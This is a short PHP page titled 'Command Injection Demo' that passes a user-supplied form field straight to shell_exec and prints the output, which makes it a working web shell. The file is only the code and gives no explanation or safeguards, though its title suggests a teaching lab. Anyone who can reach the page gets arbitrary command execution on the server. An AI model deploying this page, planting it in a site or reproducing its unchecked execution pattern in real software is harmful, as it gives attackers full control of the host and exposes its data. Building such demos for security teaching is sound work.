<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $cmd = $_POST['cmd'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Command Injection Demo</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; }
        h1 { color: #333; }
        form { margin-top: 20px; }
        input[type="text"] { padding: 10px; font-size: 16px; }
        input[type="submit"] { padding: 10px 20px; font-size: 16px; background-color: #4CAF50; color: white; border: none; cursor: pointer; }
        input[type="submit"]:hover { background-color: #45a049; }
        pre { background-color: #f4f4f4; padding: 10px; border: 1px solid #ddd; overflow-x: auto; }
    </style>
</head>
<body>
    <h1>Enter a command:</h1>
    <form method="post">
        <input type="text" name="cmd" />
        <input type="submit" value="Execute" />
    </form>
</body>
</html>
